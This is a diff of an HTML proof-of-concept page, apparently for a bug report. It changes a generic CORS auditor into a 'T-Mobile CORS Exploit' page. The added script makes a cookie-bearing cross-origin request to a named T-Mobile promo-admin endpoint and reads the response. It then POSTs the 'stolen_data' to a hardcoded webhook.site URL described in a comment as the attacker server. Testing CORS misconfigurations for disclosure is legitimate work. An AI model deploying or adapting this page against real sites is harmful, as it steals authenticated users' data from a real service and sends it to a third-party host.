@@ -2,105 +2,76 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Advanced CORS Auditor PoC</title>
+    <title>T-Mobile CORS Exploit PoC</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #e1e1e1; padding: 20px; }
-        .wrapper { max-width: 900px; margin: auto; }
-        .card { background: #1c2128; border: 1px solid #444c56; border-radius: 8px; padding: 25px; margin-bottom: 20px; border-top: 5px solid #e20074; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
-        h1 { color: #e20074; margin: 0 0 10px 0; font-size: 1.5rem; text-align: center; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-size: 0.85rem; color: #8b949e; }
-        input, select, textarea { width: 100%; padding: 12px; background: #2d333b; border: 1px solid #444c56; color: white; border-radius: 5px; box-sizing: border-box; font-family: monospace; }
-        .btn-fire { background: #e20074; color: white; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; transition: 0.3s; }
-        .btn-fire:hover { background: #ff0084; box-shadow: 0 0 15px #e20074; }
-        #log { background: #0d1117; border: 1px solid #30363d; padding: 15px; height: 400px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; margin-top: 15px; border-radius: 5px; white-space: pre-wrap; }
+        .card { background: #1c2128; border: 1px solid #444c56; border-radius: 8px; padding: 25px; margin-bottom: 20px; border-top: 5px solid #e20074; }
+        h1 { color: #e20074; font-size: 1.5rem; margin-top: 0; }
+        .stolen-box { background: #0d1117; border: 1px solid #f85149; padding: 15px; border-radius: 5px; color: #ff7b72; font-family: monospace; white-space: pre-wrap; margin-top: 15px; min-height: 50px; }
         .success { color: #39d353; font-weight: bold; }
-        .error { color: #f85149; }
-        .header-val { color: #58a6ff; }
+        .btn { background: #e20074; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #2d333b; color: white; border: 1px solid #444c56; }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <div class="card">
-        <h1>Exploit Proof of Concept</h1>
-        <p style="font-size: 0.9rem; text-align: center; color: #8b949e;">Testing Origin: <span id="current-origin" class="header-val"></span></p>
-        
-        <div class="input-group">
-            <label>Vulnerable Endpoint (Target URL):</label>
-            <input type="text" id="url" value="https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens">
-        </div>
+<div class="card">
+    <h1>T-Mobile Critical CORS Exploit</h1>
+    <p>Origin: <span class="success" id="origin"></span></p>
+    
+    <label>Sensitive Endpoint:</label>
+    <input type="text" id="target" value="https://adn.t-mobile.com/prmtns-meg-promo-api/prd01/promo-api/v1/promo-admin/client/1044/asset/MaintenanceText">
 
-        <div style="display: flex; gap: 10px;" class="input-group">
-            <div style="flex: 1;">
-                <label>HTTP Method:</label>
-                <select id="method">
-                    <option value="POST">POST</option>
-                    <option value="GET">GET</option>
-                </select>
-            </div>
-            <div style="flex: 1;">
-                <label>With Credentials (Cookies):</label>
-                <select id="creds">
-                    <option value="include">Yes (include)</option>
-                    <option value="omit">No (omit)</option>
-                </select>
-            </div>
-        </div>
+    <button class="btn" onclick="exploit()">EXPLOIT & EXFILTRATE</button>
 
-        <div class="input-group">
-            <label>POST Body (JSON):</label>
-            <textarea id="post-body" rows="2">{"brand":"TMO"}</textarea>
-        </div>
-
-        <button class="btn-fire" onclick="runAudit()">Execute Cross-Origin Request</button>
-    </div>
-
-    <div class="card" style="padding: 10px;">
-        <div id="log">Awaiting command...</div>
-    </div>
+    <div id="status">Status: Awaiting Trigger...</div>
+    <div class="stolen-box" id="output">No data stolen yet.</div>
 </div>
 
 <script>
-    document.getElementById('current-origin').innerText = window.location.origin;
+    document.getElementById('origin').innerText = window.location.origin;
+    const webhook = "https://webhook.site/7dedcf0e-fa4f-4dba-a805-04d37de87b08";
 
-    async function runAudit() {
-        const url = document.getElementById('url').value;
-        const method = document.getElementById('method').value;
-        const creds = document.getElementById('creds').value;
-        const bodyText = document.getElementById('post-body').value;
-        const log = document.getElementById('log');
+    async function exploit() {
+        const url = document.getElementById('target').value;
+        const output = document.getElementById('output');
+        const status = document.getElementById('status');
 
-        log.innerHTML = `<span style="color:#8b949e;">[*] Initiating request to:</span> ${url}\n`;
+        output.innerText = "Attempting to bypass SOP...";
 
         try {
-            const options = {
-                method: method,
-                mode: 'cors',
-                credentials: creds,
-                headers: { 'Content-Type': 'application/json' }
-            };
-            if (method === 'POST') options.body = bodyText;
+            // Step 1: Trigger the credentialed request
+            const response = await fetch(url, {
+                method: 'GET',
+                credentials: 'include', // THIS IS THE VULNERABILITY: SENDS COOKIES
+                mode: 'cors'
+            });
 
-            const response = await fetch(url, options);
-
-            const acao = response.headers.get('Access-Control-Allow-Origin');
-            const acac = response.headers.get('Access-Control-Allow-Credentials');
+            // Step 2: Read the protected response
             const data = await response.text();
+            const acao = response.headers.get('Access-Control-Allow-Origin');
 
-            log.innerHTML += `[+] HTTP Status: <span class="success">${response.status}</span>\n`;
-            log.innerHTML += `[+] ACAO Header: <span class="header-val">${acao || 'None'}</span>\n`;
-            log.innerHTML += `[+] ACAC Header: <span class="header-val">${acac || 'None'}</span>\n\n`;
-            
-            if (acao === window.location.origin) {
-                log.innerHTML += `<span class="success">[!!!] VULNERABILITY CONFIRMED: ORIGIN REFLECTED</span>\n\n`;
-            }
+            // Display results on screen for the report screenshot
+            status.innerHTML = `HTTP Status: <span class="success">${response.status}</span> | ACAO: <span class="success">${acao}</span>`;
+            output.innerText = data ? data : "[Empty Response - But Handshake Successful]";
 
-            log.innerHTML += `<b style="color:#e20074;">STOLEN DATA / RESPONSE BODY:</b>\n<hr style="border:0;border-top:1px solid #333;">${data || '[Empty Response]'}`;
+            // Step 3: Exfiltrate the data to your attacker server (Webhook)
+            fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors', // Ensures exfiltration works even if webhook has its own CORS
+                body: JSON.stringify({
+                    vulnerability: "CORS_BYPASS",
+                    origin: window.location.origin,
+                    stolen_data: data,
+                    headers: {
+                        "Access-Control-Allow-Origin": acao
+                    }
+                })
+            });
 
         } catch (err) {
-            log.innerHTML += `<span class="error">[!] Error: ${err.message}</span>\n\n`;
-            log.innerHTML += `The browser's Same-Origin Policy blocked the read. \nThis means the server did NOT reflect the ACAO header for this specific origin.`;
+            output.innerText = "Exploit failed. Possible reasons:\n1. Server fixed the regex.\n2. Endpoint requires specific headers/body.\n3. You are not on the correct GitHub domain.";
+            console.error(err);
         }
     }
 </script>
